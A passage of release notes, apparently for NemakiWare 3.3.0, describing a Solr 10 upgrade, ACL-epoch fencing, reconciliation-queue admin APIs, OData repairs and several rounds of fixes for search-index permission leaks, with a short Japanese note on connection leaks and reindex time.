<field name="content_generation" type="long" indexed="true" stored="true" required="false" multiValued="false" />
```

then `curl "http://{solr}/solr/admin/cores?action=RELOAD&core=nemaki"`, and confirm all three with
`curl "http://{solr}/solr/nemaki/schema/fields"` **before** starting the mandatory full reindex.

**Do this on any stack whose Solr data volume survives the upgrade — which is the default.**
`docker-compose-prod.yml` and `docker-compose-simple.yml` both mount the named volume `solr_data` at
`SOLR_HOME=/var/solr/data`, and `--build --force-recreate` keeps named volumes. So upgrading an
existing deployment gives you the **Solr 10 image with your Solr 9-era `schema.xml`**, not a fresh
core. Only a genuinely new stack (or one where the volume was deliberately removed) seeds the schema
from the image.

`effective_acl_epoch` is the one that bites hardest: `AclEpochIndexWriter` sends it in the same
atomic update as the reader tokens, so if it is missing the **mandatory initial ACL-epoch stamp fails
for every document**, and the migration verdict comes back `UNKNOWN` rather than `INCOMPLETE`.

**This fixes a real clobber**: a slow full-document rebuild (body re-extraction, rename, move) that
finished after a fresh `applyAcl` used to overwrite the new reader tokens with the ones it had
computed minutes earlier. The content writer now preserves whatever ACL group Solr already holds
rather than re-emitting its own.

### Persistent-format addition (reconciliation queue)

Reconciliation task documents (`type: searchIndexAclReindexTask` in `nemaki_conf`) gain a
`minRequiredEpoch` field. It records the highest ACL epoch a task is obliged to reconcile, and is
merged monotonically so a later best-effort refresh cannot lower an obligation a finalized epoch
raised. Existing tasks have no such field and read as `0` — no migration is required, and the next
enqueue fills it in. A field that is PRESENT but not a non-negative integer is treated as corruption
and surfaces rather than being read as `0`.

Such an entry is **contained, not propagated**: it is skipped for execution (never claimed — its
obligation is unknown), while staying visible in `GET /api/v1/admin/search-index/reconcile`
(`corruptCount`), in `GET /metrics` (`corrupt`), and in a new
`GET /api/v1/admin/search-index/reconcile/corrupt` listing that reports each entry's `objectId` and
the reason. It is removed with `DELETE /api/v1/admin/search-index/reconcile/corrupt/{docId}`,
addressed by CouchDB `_id` because resolving a `taskId` would mean deserializing the document that
will not deserialize; that route REFUSES a healthy document. After deleting one, re-index its
`objectId` — deleting a task drops only the automatic retry. Earlier 3.3.0 pre-releases let a single
corrupt entry stall the whole queue with no way to remove it through the API.

### ACL-epoch fencing is now the ACL write path (no switch)

ACL mutations (applyAcl, move) run a two-phase outbox: the pending marker rides the SAME CouchDB
write as the ACL change, an epoch is finalized post-commit, the Solr ACL group is written under the
epoch fence (`readers` + `effective_acl_epoch`, `_version_` CAS), and a durable reconciliation
obligation guarantees convergence across crashes. A leader-gated recovery sweep runs every 5
minutes. This replaces the previous `acl_index_generation` fence, which could not order a change
made on an ANCESTOR — the reason inherited-ACL and move revocations could go stale in the index.

There is no enable/disable setting: the pre-epoch path has been removed. A pre-release
`acl.epoch.wiring.enabled` briefly existed; a leftover `false` is ignored and warned about at
startup.

**Per deployment, in this order:** full reindex → initial-epoch migration

> **接続リークは解消済みです (2026-08-13 更新)。** 修正前は 2,510 文書の再索引で
> ESTABLISHED が 3 → 1,289 まで増え、完了後も約 90 秒張り付き、テスト 1 周で約 5,000 件の
> leak 警告が出ていました。**97,693 オブジェクトまで実測**して、再索引中のピーク 5
> (アイドル時 3)・leak 警告 0 件を確認しています (この観測は**再索引を完走させておらず**、
> 約 1.4 時間・370 サンプルの部分観測です)。**20 万以上は未実測**なので、その規模では
> 引き続き接続数を監視し、必要なら分割してください。詳細は F3 in
> [`docs/design/v3.3-release-blockers.md`](docs/design/v3.3-release-blockers.md)。
>
> **所要時間にご注意ください。** 10 万文書規模の全再索引は **10 時間級**かかります
> (処理レートが規模とともに 10.3 → 2.6 件/秒に低下。台帳 RX1)。
(`verdict` COMPLETE / COMPLETE_EXCEPT_ORPHANS). Skipping the migration is not fatal — each
document's first ACL write fences it — but it produces a reconciliation burst instead of a quiet
upgrade.

The Solr field `acl_index_generation` is gone from the shipped schema. Existing `SOLR_HOME`s keep
an unused definition (inert); a fresh one simply never has it.

Also fixed while plumbing this: an ordinary update (rename, property edit) used to RE-MINT
`content_incarnation` on every write because the model never carried it — each update silently
started a new content "lifetime" for the content fence. Updates now round-trip it verbatim.

### New admin API: orphaned index entries (dry-run + confirmed delete)

`GET /api/v1/admin/acl-epoch/migration/{repo}/orphans` lists index entries whose CouchDB content is
definitively gone (the residual behind `COMPLETE_EXCEPT_ORPHANS`); `DELETE` on the same path with
the **mandatory `?confirm=true`** removes the verified ones. Verification is fail-closed — only a
definitive 404 qualifies, a read error never does — and every delete is a Solr `_version_` CAS, so
a concurrently restored object is never deleted over. Admin-gated and CSRF-protected.

### New admin API: initial ACL-epoch stamp (run it AFTER the full reindex)

`POST /api/v1/admin/acl-epoch/migration/{repositoryId}` stamps the initial `effective_acl_epoch` on
every CMIS object in a repository's Solr index; `GET` on the same path reports progress and a
`verdict`. Both are admin-gated and CSRF-protected.

**Order matters, and getting it wrong silently discards the work.** Run this AFTER the mandatory
full reindex, never before: the reindex rebuilds every document through the content writer, whose
fence preserves whatever ACL group Solr already holds — and on a freshly-rebuilt index there is
nothing to preserve.

The run is restartable by simply running it again: an already-stamped document is recognised from
the query and skipped without recomputing anything.

Read the `verdict`, not the raw count:

| verdict | meaning |
|---|---|
| `COMPLETE` | every CMIS object in the index carries an epoch. Reported from the live index, so it is still `COMPLETE` after a restart even though the in-memory run record is gone |
| `COMPLETE_EXCEPT_ORPHANS` | done; the residual is index entries whose CouchDB content was deleted and which can never be stamped |
| `EMPTY_INDEX` | the repository has NO CMIS objects indexed — almost always "the full reindex has not been run yet". **Not** done |
| `INCOMPLETE` | documents remain that could have been fenced — repair any reported quarantine blockers, then re-run |
| `PARTIALLY_FENCED_NO_RUN_RECORD` | part of the index carries epochs and part does not, with no run record in this JVM. Ordinary ACL writes bootstrap epochs one document at a time, so this does **not** prove a migration ran — run the stamp (reindex first if one is pending) |
| `NOT_RUN` / `RUNNING` / `FAILED` / `UNKNOWN` | no conclusion available. `NOT_RUN` now means "no run record AND nothing in the index is fenced"; a finished migration no longer degrades to `NOT_RUN` on restart |

An unknown repository id is a 404 listing the configured ids — never a completed migration.

Running it does not switch anything ON — the epoch writer is already the ACL write path in 3.3.0.
What the stamp buys is a QUIET upgrade: without it, every document's first ACL mutation has to
bootstrap its own fence and the reconciliation queue absorbs the burst.

### New admin API: ACL-epoch outbox scanner

`POST /api/v1/admin/acl-epoch/scan/{repositoryId}` runs one bounded crash-recovery sweep of the
ACL-epoch outbox and returns a summary; `GET` on the same path returns the last one. `POST
/api/v1/admin/acl-epoch/finalize/{repositoryId}/{docId}` finalizes a single document. Admin-gated
and CSRF-protected. `more: true` in the summary means the pass hit its budget — run it again;
progress is durable.

The same sweep also runs automatically every 5 minutes on the leader (see the ACL-epoch section
above); this endpoint is the on-demand version, for when you do not want to wait for the next tick.
A healthy deployment reports zeros: the sweep exists for state left behind by a crash between an
ACL mutation's commit and its finalize, which is rare by construction.

Reconciliation tasks created by the outbox ACK are now recorded with reason `OUTBOX_ACK` instead of
`INDEX_WRITE_FAILURE`. The ACK runs for a mutation that succeeded, so the old label sent anyone
triaging the queue looking for a Solr failure that never happened. The field is free-form; existing
tasks are unaffected.

### New admin API: ACL-epoch quarantine

`GET /api/v1/admin/acl-epoch/quarantine` lists the quarantined documents that have blocked an
ACL-index refresh (a quarantined ANCESTOR blocks its whole subtree), and
`POST /api/v1/admin/acl-epoch/quarantine/{repositoryId}/{docId}/repair` repairs one — normalizing
its epoch fields and clearing the marker in a single CAS. Blocked reconciliation tasks are retained
under a capped backoff and resume on their own after the repair; no manual re-enqueue. Both are
admin-gated and CSRF-protected.

A quarantine is how the fence refuses to guess: a document whose epoch fields are corrupt cannot be
used as a source for anyone's effective epoch, so it is isolated rather than read optimistically.
A healthy deployment reports zeros; a non-zero list is an operator action, not a self-healing wait.
_On `deps/v3.3-breaking-majors` (off `master`). First minor with breaking-major
dependency bumps. No CouchDB view / patch / schema / Mango changes — the 2.4
data carry-over path is untouched; all changes are dependency, container, and
OData/runtime code._

### Breaking-major dependency uplift
- **Apache Olingo (OData) 4.10 → 5.0** (all six modules; Java 17+, jakarta.servlet).
- **Apache Solr / Lucene 9 → 10** (solr-solrj 10.0.0, lucene 10.3.2). The removed
  `HttpSolrClient`/`Http2SolrClient` are replaced by `HttpJdkSolrClient` with
  `useHttp1_1(true)` (avoids HTTP/2 RST_STREAM against Jetty 12); Solr 10 defaults
  to SolrCloud so the container runs `solr-foreground --user-managed`; the legacy
  fat-jar Solr module was dropped from the reactor.
- **Netty 4.1 → 4.2** (netty-bom 4.2.16.Final), **react-router-dom 6 → 7**
  (HashRouter), **Ant Design 5 → 6** (@ant-design/icons 6), plus the Tier-1/2
  bumps (jakarta.annotation 3, i18next 26, jsdom 29).

### OData binding repaired + hardened
Entity-set reads (`/Documents`, `/Folders`, `/Objects`, …) had always returned
`400 "Function not found in URI"`. Root cause: `CmisFunctionProcessor` implements
the same Olingo interfaces as the entity-set processors and, since Olingo keeps
one processor per interface, clobbered them — every read was misrouted to the
function processor. (Pre-existing; reproduced on Olingo 4.10 and 5.0.) Fixes:
delegate function URIs from the entity-set processors so one processor serves
each interface; replace the hand-rolled `ODataHandlerImpl` shim with Olingo 5.0's
jakarta-native `ODataHttpHandler` + `setSplit(1)`; expose the unbound functions
(`Query`/`GetObjectByPath`/`GetContentChanges`) as function imports; map CMIS
exceptions to correct HTTP status (409/400/404/403/405) instead of a blanket 500;
always emit `@odata.count`; fix a null-`Holder` NPE in `$expand=children`.
Validated: full OData IT suite 65/65, Apache Olingo *client* consumes the service
4/4, `$metadata` validates against the OASIS OData 4.0 CSDL XSD, and a
conformance checklist (Minimal + Intermediate) passes 21/21. See
`tools/odata-conformance/`.

### Native ARM64 (Apple Silicon) container images
- **TEI** (`docker/tei/Dockerfile.arm64`): native arm64 build of Hugging Face
  Text Embeddings Inference (MKL dropped, `ort,candle` backends) exposing the same
  `/embed` API; non-root UID; opt-in via `NEMAKI_TEI_IMAGE`/`NEMAKI_TEI_PLATFORM`.
- **Apache Atlas** (`docker/atlas/Dockerfile.arm64`): native arm64 Atlas 2.3.0
  built from source; the dead expired-cert Hortonworks repo is mirrored to clojars
  so **full Maven TLS validation stays on**; the container **exits when the Atlas
  server process dies** (supervised CMD + `restart: unless-stopped`) instead of
  lingering; non-root UID; build context pinned to a commit SHA; opt-in via
  `NEMAKI_ATLAS_IMAGE`/`NEMAKI_ATLAS_PLATFORM`.
- Both dev/eval overlays bind their ports to `127.0.0.1`.

### Security / hygiene
- npm audit HIGH cleared at the time (brace-expansion 5.0.7, js-yaml 4.3.0); Solr runtime
  index/tlog data that had been committed by accident was removed from history and
  is now gitignored.
  **This no longer holds** — see "3.3.0 で解決した既知の問題" near the top of this file. js-yaml 4.3.0
  is itself in the vulnerable range of a later advisory.

### Review remediation — ORDER BY + paging correctness
- **[P1] ORDER BY / the repository default order was applied only within a page,
  not before paging.** The query path sliced the ACL-filtered page first
  (`permitted.subList(skip, …)`) and then sorted only that page inside
  `compileObjectDataListForSearchResult`, so a page size of 1 made the sort a
  no-op and pages came back in Solr's native `modified desc` order — page N
  disagreed with the unpaged ORDER BY (and with the configured
  `capability.extended.orderBy.default=cmis:creationDate DESC`). Fix: a new
  `CompileService.sortContentsForSearchResult` orders the whole ACL-authorized
  set (by the ORDER BY, or the repository default when none is given) **before**
  it is sliced; the page compile is then called with `orderBy="NONE"` so it is
  not re-sorted. The ordering compile is properties-only and cached
  (`objectDataCache`), so the page compile only recomputes allowable actions /
  ACL. Both the CMIS Browser query and the OData entity-set path are fixed.
- **[P1] OData `$orderby` was silently dropped (pre-existing).**
  `convertOrderByToClause` read the property name from
  `item.getExpression().toString()`, which for a `$orderby=name` Member
  expression is the Olingo AST rendering, not the property name — so it mapped to
  nothing and no ORDER BY was emitted (falling back to the default order). It now
  extracts the name from the resource path exactly as `$filter` does.
- **Verification**: live pre/post (the bug reproduced on the old build, every
  case matched after the fix); Olingo *client* IT 6/6 (new
  `olingoClientOrderByIsAppliedAndOrderedPagingMatches`: desc == reverse(asc) and
  ordered `$top=1` page concatenation == the unpaged order); OData functional IT
  65/65; the conformance checklist's `$orderby` check was tightened from
  HTTP-200-only to asserting real ordering (25/25); CMIS Browser paging
  unregressed.

### P2 remediation — OData IT CI gate + arm64 supply-chain verification
- **OData ITs are now a real CI gate.** A new `odata-tests` job in
  `integration-tests.yml` starts the live stack, runs `ci-complete-setup.sh`,
  seeds documents via the new `scripts/ci-seed-odata-docs.sh` (so the paging /
  `$orderby` regression tests, which `assumeTrue(total >= 2)` and
  `assumeTrue(distinct names)`, actually execute instead of skipping on a fresh
  DB), then runs `ODataDocumentsIT`/`ODataFoldersIT`/`ODataOlingoClientValidationIT`
  (71 tests) with the JUnit `@Disabled` condition deactivated. Previously these
  ITs only ran by hand. The seed step is **fail-closed**: it idempotently creates
  fixed distinct-named documents (409 = already exists is fine) and polls the
  query path until count ≥ 3, every seed name is queryable, and all names are
  distinct — exiting non-zero otherwise, so the gate cannot pass by silently
  skipping its regressions.
- **arm64 build inputs are pinned and verified (fail-closed).**
  - Atlas: `docker/atlas/Dockerfile.arm64` adds `ARG ATLAS_SRC_SHA512` and runs
    `sha512sum -c` on the downloaded `apache-atlas-2.3.0-sources.tar.gz` (the
    pinned value matches Apache's official `downloads` and `archive` checksums),
    so a tampered mirror / MITM aborts the build.
  - TEI: `docker/tei/build-arm64.sh` adds `TEI_EXPECTED_COMMIT` and, after
    `git clone --branch v1.7.4` (a mutable tag), verifies `HEAD` equals the
    pinned commit `6e900af…` (resolved identically by `git ls-remote` and the
    GitHub API) and aborts on mismatch.

### Integration-review remediation — ACL-scan reachability (P1)
- **The ACL-scan cap now rejects over-large result sets instead of faking
  `hasMoreItems`.** The query path fetches at most
  `-Dnemakiware.cmis.query.aclScanMaxRows` (default 10000) Solr rows, then
  authorizes / sorts / pages them in memory. Previously, when the pre-ACL match
  count exceeded the cap it reported `numItems` as a lower bound with
  `hasMoreItems=true` — but rows past the cap are unreachable, so a paging client
  looped forever, `$orderby` sorted only the first cap rows (wrong global order),
  and even `$top=1` paid the full cap-sized fetch/authorize cost (a
  low-privilege DoS). Now, when Solr's `numFound` exceeds the cap the query is
  rejected with **HTTP 400** *before* the getContent/ACL/ObjectData/lock work,
  with a message telling the caller to narrow the query or raise the cap. Within
  the cap the whole authorized set is materialized, so `numItems` is the **exact**
  authorized total and `hasMoreItems` (`skip+max < total`) is honest — *except* while
  a permission change is still propagating, when the query may deliberately return a
  confirmed prefix rather than a 400 (see the `truncatedByAclScanLimit` extension in
  3.3.0). In that degraded window `numItems` is a lower bound; the extension flag is
  how a client tells the two apart. Pinned by
  `SolrQueryProcessorScanCapTest` (cap allowed, cap+1 rejected) and verified live
  (cap=2: broad query → 400, narrow → 200; default cap: honest `hasMoreItems`,
  exact `numItems`).

### Integration-review remediation (second pass)
- **The cap rejection no longer leaks the pre-ACL count, and rejects before
  transferring bodies.** The query now runs a `rows=0` count probe first: an
  over-cap match set is rejected from that cheap probe, before any document
  bodies are transferred (so even `$top=1` no longer pays a cap-sized fetch), and
  the 400 message is generic — it no longer echoes the pre-ACL `numFound` (which
  counts objects the caller cannot read). A race-window re-check on the real
  fetch keeps the same generic message.
- **Browser Binding CSRF — a compatibility-preserving check is now applied**
  (reversing the earlier "out of scope" stance). `/browser/*` POSTs are rejected
  with 403 when `Sec-Fetch-Site: cross-site` is present or an `Origin` header is
  cross-origin; a request with neither header — a non-browser CMIS client
  (cmislib, the TCK, scripts) — is still allowed. This blocks a browser-forged
  cross-site POST without requiring the full token/`X-Requested-With` validation
  that would break CMIS clients. `CsrfValidator.validateBrowserBindingCsrf` +
  `CsrfValidatorBrowserBindingTest` (8 cases); verified live (header-less → 201,
  cross-site → 403, cross-origin Origin → 403, same-origin → 201).
- **The OData seed no longer rejects legally same-named documents.**
  `ci-seed-odata-docs.sh` dropped the repo-wide name-uniqueness requirement (CMIS
  allows same-named documents in different folders); it now only verifies its own
  distinct-by-construction seed names are present and count ≥ 3. It stays
  fail-closed on a Solr-indexing timeout.
- **The new regression tests are now CI-gated.**
  `SolrQueryProcessorScanCapTest` and `CsrfValidatorBrowserBindingTest` were added
  to the unit-tests job's explicit `-Dtest` list. (The Node 20→22 bump and the
  OData 500 redaction were already completed in the prior commit, including the
  Maven `frontend-maven-plugin` nodeVersion.)
### Integration-review remediation (third pass)
- **The OData gate can no longer go green by skipping.** The seed relaxation
  above meant the `$orderby` test would `assumeTrue`-skip whenever *any* two
  documents in the repository shared a name (which CMIS allows across folders),
  passing Surefire without running the regression. The Olingo IT now **self-seeds**
  a distinct set (`@BeforeAll`, idempotent, co-operating with the CI seed script)
  and both paging/`$orderby` regressions read **only** that set via
  `$filter=startswith(name,'odata-ci-seed-')` with **hard assertions** (no
  `assumeTrue`). Verified live: 6/6, 0 skipped.
- **The two-phase cap logic is now regression-pinned.** `queryWithinScanCap` was
  extracted and `SolrQueryProcessorScanCapTest` (9 tests) now drives it with a
  mock `SolrClient` to assert: phase 1 queries with `rows=0`, an over-cap match is
  rejected **without a second query**, the rejection message carries **no pre-ACL
  count**, growth between the probe and the fetch is caught by the re-check, and a
  within-cap query fetches with `rows=cap`.
- **Security docs reconciled** with the new Browser Binding CSRF policy
  (`CLAUDE.md`, `docs/MANUAL-VERIFICATION-SECURITY-AUDIT.md`,
  `docs/MANUAL-VERIFICATION-CONNECTORS.md`, `docs/design/connector-delegation.md`
  no longer say `/browser` is CSRF-exempt).
### ACL-in-Solr — the cap now bounds the caller's authorized count, not the repo total
The pre-ACL cap rejection (a low-privilege user could not search a large
repository even when their authorized subset was tiny, and the "is the overall
match over the cap" bit was observable pre-ACL) is **resolved** by pushing
authorization into Solr, mirroring the pattern RAG already uses.
- **Index side** (`SolrUtil.createSolrDocument`): every queryable content object —
  documents, folders, items **including principal items** (user/group items sit
  under `/.system` with a normal inherited ACL, default `GROUP_EVERYONE:read`, and
  were visible to non-admins through the in-memory filter) — is stamped with
  repository-scoped reader tokens from `ACLExpander.expandToReaders`
  (`user:{repo}:{id}` / `group:{repo}:{id}` / `anyone:{repo}`, admin-only
  fail-closed) in the `readers` field. A **relationship** stores no ACL of its
  own — its read permission is `read(source) OR read(target)`
  (`checkRelationshipPermission`) — so it is stamped with the **union of its
  source's and target's readers** (`relationshipReaders`). The field already
  exists in the nemaki core schema (used by RAG) — **no schema change**.
- **Query side** (`SolrQueryProcessor.aclFilterQueries`): a non-admin query adds a
  plain `readers:(...)` fq plus a `-doc_type:[* TO *]` exclusion of RAG docs, so
  **Solr returns only authorized documents and `numFound` is the authorized
  count** — relationships carry their source/target readers so they are filtered
  like any other content (no carve-out). Admins bypass the readers restriction
  (they see everything, as before); the in-memory `permissionService.getFiltered`
  stays as defense-in-depth. Fail-safe: an admin-check failure is treated as
  non-admin, and if the expander is unwired (or the caller anonymous) the fq is
  skipped and `getFiltered` still enforces ACL. Pinned by
  `SolrQueryProcessorAclFilterTest`, added to the CI unit-tests gate.
- **ACL changes propagate** (`AclServiceImpl`): the changed object is re-indexed
  by `updateInternal`; inheriting descendants have their content `readers`
  re-indexed by the (now content-aware) recursion, regardless of whether RAG is
  enabled. A **stale-cache fix** evicts the object's cached ACL *before*
  `updateInternal` re-indexes, so `createSolrDocument → expandToReaders →
  calculateAcl` recomputes readers from the just-applied ACL (calculateAcl
  otherwise returns the cached Acl).
- **⚠️⚠️ Upgrade — a full CMIS + RAG reindex is SECURITY-MANDATORY, not
  optional.** An index built by a pre-fix build carries the old
  **member-expanded `user:` tokens** on documents (group members and admins
  expanded at index time), and existing content has no `readers` field at all.
  Until the rebuild, the round-2 revocation fixes (group departure / admin
  demotion) **do not take effect for old data**, with three concrete consequences:
  (1) content with no `readers` is invisible to non-admin search (fail-closed —
  not a leak); (2) stale member-expanded tokens keep matching after a departure,
  so CMIS `numFound` stays inflated and can trip the ACL scan-cap 400, and the RAG
  seed / findSimilar paths (token-gated, no PermissionService on the seed) stay
  matchable for a departed member; (3) the over-broad token sets bloat the RAG
  candidate pool. (The RAG *result* stage is still filtered by PermissionService,
  so this is not a plain body leak — but the seed oracle and numFound/cap
  correctness are real.) v3.3 already requires a Solr-10 reindex, so this is the
  same step, but it MUST run before exposing the upgraded system:
  `POST /api/v1/cmis/repositories/{repo}/search-engine/reindex` and (if RAG is
  enabled) `POST /api/v1/cmis/repositories/{repo}/search-engine/rag/reindex`.
  Until the rebuild completes, treat the deployment as pre-fix for revocation.
- **Verified live**: readers populated on content; a non-admin sees the
  `GROUP_EVERYONE` documents but not a restricted one (admin sees it);
  grant/revoke reflects immediately (tokens add/remove); and with `cap=2` over a
  14-document repository a low-privilege user authorized to 2 documents gets
  **HTTP 200** with their two docs while an admin authorized to all 14 gets 400.
  Admin bypass keeps TCK QueryTestGroup 6/6, OData IT 71/71, conformance 25/25 and
  the focused unit tests unregressed.

### ACL-in-Solr — revocation soundness (review: P0 + two P1)
- **[P0] Group departure left stale search access (an actual RAG leak).**
  `ACLExpander.expandToReaders` expanded a group's *current members* into
  `user:{repo}:{id}` tokens at index time, so a removed member (or nested-subgroup
  member, or demoted admin) kept a stale user token on every document until it was
  re-indexed — and the query always includes the caller's own user token, so it
  kept matching. CMIS was corrected by `getFiltered` (but numFound inflated and
  could trip the scan cap); **RAG has no final ACL check, so it returned document
  names / paths / chunk text**. Fix: the index now stores **only the
  ACL-directly-named principal tokens** (member expansion removed); membership is
  resolved at query time (`getGroupIdsContainingUser` is transitive over nested
  groups on both the CMIS and RAG paths — verified), which is **revocation-safe
  with no re-index**. Verified live: a user loses search access to a
  group-granted document the instant they leave the group, without re-indexing the
  document. This also closes the pre-existing RAG leak. `ACLExpanderTest` updated
  to the no-expansion contract.
- **[P1] Move left the old parent's inherited ACL.** A folder move did not evict
  the moved object's ACL cache before re-indexing, and never re-indexed
  descendants, so a public→private move left stale, over-permissive readers.
  Fix: `ContentServiceImpl.move` evicts the moved object's ACL cache before its
  re-index, and `ObjectServiceImpl.moveObject` calls the new
  `AclService.refreshMovedSubtreeSearchIndexAcl` (same evict + recursive re-index
  as the applyAcl path) for inheriting descendants. Verified live: after moving a
  public folder into a private one, a descendant document's readers refresh within
  ~5 s and a non-admin loses search access — no manual re-index.
- **[P1] Relationships reintroduced the pre-ACL cap.** (Superseded the earlier
  full fq exemption.) Relationships now carry `readers(source) ∪ readers(target)`
  and are filtered by the normal fq, so numFound is authorized.

### ACL-in-Solr — revocation soundness, round 2 (review: three P1 + one P2 + P3)
The round-1 fixes were correct for group departure but a second review found the
grant direction, admin demotion, the async window, and a cyclic-group DoS still
open. All fixed; each has an automated pin and (where observable) a live check.
- **[P1] A grant on a relationship endpoint was never reflected in search
  (permanent unsearchability), and a revoke re-tripped the cap.** For a
  relationship, `getFiltered` can only REMOVE a hit Solr returned — it cannot ADD
  one Solr excluded. So a user newly granted read on the source/target could never
  find the relationship, and a revoke left a stale over-permissive token inflating
  numFound (false 400). Fix: an ACL change (`applyAcl`) and a move now
  **reverse-look-up the relationships referencing the changed object**
  (`getRelationsipsOfObject(..., EITHER)`) and re-index them
  (`AclServiceImpl.updateSearchIndexACLRecursively`, for the root as well as
  inheriting descendants). Verified live: granting read on a source document
  propagates the new principal onto the relationship's `readers` within the async
  refresh.
- **[P1] Admin demotion still left RAG access.** The null/empty-ACL fallback
  expanded the *current* admins into individual `user:` tokens — the same
  revocation hole as group members. Fix: stamp the single **`admin:{repo}` ROLE
  token**; only a current admin is granted it at query time
  (`ACLExpander.buildReaderTokenSet` / `buildReaderFilterQuery`), so demotion takes
  effect immediately without re-indexing. Pinned by `ACLExpanderTest`.
- **[P1] The move / applyAcl descendant re-index is async, so RAG had a stale
  window** (CMIS is corrected by `getFiltered`, but RAG had no final ACL check).
  Fix (the reviewer's recommended permanent closure): a **final live-ACL gate on
  every RAG hit** (`VectorSearchServiceImpl.filterByLiveAcl` →
  `ACLExpander.isReadableByTokens`) — the RAG analog of CMIS `getFiltered`. The
  Solr `readers` fq is now only an optimization; each hit is re-verified against
  live ACL (calculateAcl, whose cache is evicted on any ACL change / move), so a
  stale, over-permissive index entry can never leak a name/path/chunk — closing
  the move, applyAcl, relationship, admin-demotion and group-departure windows for
  RAG in one place. Pinned by `ACLExpanderTest` (intersect / disjoint / missing).
- **[P2] A cyclic nested group (A→B→A) StackOverflowed every non-admin search.**
  The query-time group resolution recursed with no visited set, and group editing
  only rejected direct self-add. Fix: `PrincipalServiceImpl.containsUserInGroup`
  now carries a per-walk visited set (read side, the DoS fix), and
  `ContentServiceImpl.update()` — the single choke point all group edits route
  through — rejects an edit that would introduce an indirect cycle (write side).
  Verified live: A→B→A add is rejected with a clear error, a legitimate C→B add
  still succeeds; pinned by `PrincipalServiceImplCycleTest`.
- **[P3]** Stale comments corrected (`SolrQueryProcessor` relationship "carve-out"
  and `queryWithinScanCap` "pre-ACL numFound"; `ACLExpander` class Javadoc step 3;
  `SolrUtil.relationshipReaders` residual note).

### ACL-in-Solr — revocation soundness, round 3 (multi-agent self-review: P1 + two P2 + P3 batch)
A 5-lens × 3-refuter adversarial self-review of the round-2 commit surfaced four
residual defects; all fixed and live-verified.
- **[P1] Moving a LEAF document never refreshed its relationships.**
  `refreshMovedSubtreeSearchIndexAcl` early-returned for any non-folder, so round
  2's relationship reverse-reindex ran for folder moves and applyAcl but not for a
  moved leaf document (the common case — ingest links documents via
  hasAttachment / attachedToRecord / derivedFromContext). A grant via the new
  parent stayed permanently unsearchable on those relationships; a restrictive
  move kept inflating numFound. Fix: the early return is now `content == null`
  only; a leaf still runs the relationship refresh
  (`updateSearchIndexACLRecursively(isRoot=true)` skips the root's own content
  readers but refreshes its relationships, and recurses only for a folder).
  Verified live: moving a leaf from a restricted folder into a public one now adds
  `GROUP_EVERYONE` to the relationship's readers (previously stuck at admin/system).
- **[P2] findSimilarDocuments authorized the similarity SEED only via the
  stale-able Solr fq.** The results get the live-ACL gate, but the seed vector
  (`getDocumentVector`) was authorized purely by the indexed readers fq, so during
  a stale-permissive window (async re-index, a failed refresh, or a not-yet-rebuilt
  pre-fix index) a revoked caller could use a revoked document as a seed — an
  existence + semantic-neighbourhood oracle. Fix: re-verify the seed with
  `isReadableByTokens` and treat an unreadable seed identically to "not found"
  (same exception, preserving indistinguishability).
- **[P2] The cyclic-group rejection returned HTTP 500 on the Spring/api-v1 group
  endpoints.** `assertNoNestedGroupCycle` threw `IllegalStateException`, which the
  per-method generic `catch (Exception)` mapped to 500 (invalid client input → 500,
  a class this project treats as a defect). Fix: throw `IllegalArgumentException`
  (both layers already map it to 400) and add a specific catch ahead of the generic
  one in `GroupController` and `GroupResource`. Verified live: api/v1 cycle add →
  400 ProblemDetail; a non-cyclic edit → 200.
- **[P3 batch]** (a) `searchWithBoost`/`searchInFolder` now apply the live gate
  BEFORE the topK trim (inside `executeWeightedKnnSearch`, matching
  findSimilarDocuments) so a dropped stale hit no longer shrinks the page below
  topK; (b) `updateSearchIndexACLRecursively`'s descendant walk is now guarded per
  node so a transient `getChildren`/single-child failure is bounded to that subtree
  instead of abandoning the whole traversal (docs softened to best-effort);
  (c) move-coverage Javadoc (`AclService`, `AclServiceImpl`, `ObjectServiceImpl`)
  corrected to include leaves; (d) `UserGroupServiceDelegate.containsUserInGroup`
  gained a visited set (no live caller today, but a latent StackOverflow hazard;
  a dangling-subgroup abort-the-whole-walk side bug was also fixed).
- **Reviewed and cleared:** the CMIS getFiltered path's cyclic-group DoS is a
  non-issue — `UserGroupDaoDelegate.getJoinedGroupByUserId` already carries a
  visited set + maxIterations=50.

### ACL-in-Solr — durable reconciliation queue for failed async ACL refreshes
Closes the round-3/4 known limitation ("the relationship reverse-reindex is async
best-effort; a permanently-failed refresh stays stale until the next ACL touch or a
full reindex"). Failed asynchronous search-index ACL refreshes are recorded in a
CouchDB queue, **re-driven with confirmed (synchronous) writes**, and are
operator-observable. A first implementation was reworked after review to make the
concurrency/durability semantics actually hold:
- **Atomic dedupe + CAS** (`SearchIndexReconciliationService`): each entry lives
  under a DETERMINISTIC `_id` (`search-index-acl-reconcile::{repo}::{object}`), so
  concurrent enqueues for the same object collapse to one document (a create
  conflict resolves to an in-place update), and **every state transition is a
  `_rev` compare-and-swap** — a stale rev → 409 → the operation is abandoned. Two
  replicas therefore cannot both process an entry, and a poller cannot clobber a
  newer failure event that arrived mid-flight (a new enqueue bumps `generation`,
  which changes the rev and makes the in-flight CAS delete fail, so the fresh
  failure survives). Lifecycle `PENDING → LEASED → (deleted | PENDING | FAILED)`;
  a crashed poller's lease expires and is reclaimable.
- **Confirmed re-drive** (fixes the core review defect): the poller re-drives via
  `AclService.reindexSearchIndexAclForObject` with `forceSync=true`, so the Solr
  writes complete SYNCHRONOUSLY and a failure throws and is counted — the entry is
  only completed (CAS-deleted) when the re-drive is genuinely clean (previously a
  fire-and-forget async submit reported clean and the entry was deleted before the
  write was known to have landed, re-opening the very `INDEX_WRITE_FAILURE` it was
  meant to fix). A cache-eviction failure (a precondition for a correct re-index)
  is also counted / enqueued rather than treated as success.
- **DB-side due selection**: the poller claims via a Mango `$lte` range + ascending
  sort on `nextAttemptAt` (epoch millis), served by `(type,status,nextAttemptAt)` —
  so the oldest-due entries come first and a backlog beyond one batch is not
  starved. Expired leases are reclaimed via `(type,status,leaseExpiresAt)`.
- **Enqueue points** (`AclServiceImpl`): every caught failure — per-node
  content/RAG/relationship refresh, a `getChildren` traversal failure, a cache
  eviction failure, and (via a `SolrUtil.indexDocument` `onPermanentFailure`
  callback) an async Solr write that exhausts its bounded retries — records the
  object; the outer async task enqueues the root on a whole-traversal throw.
- **Admin API + metrics** (`/api/v1/admin/search-index/reconcile`, admin-gated,
  CSRF-protected): list (by status), `GET /metrics` (pending/leased/failed counts,
  oldest-pending age, enqueue-failure count — for alerting), force-retry, delete.
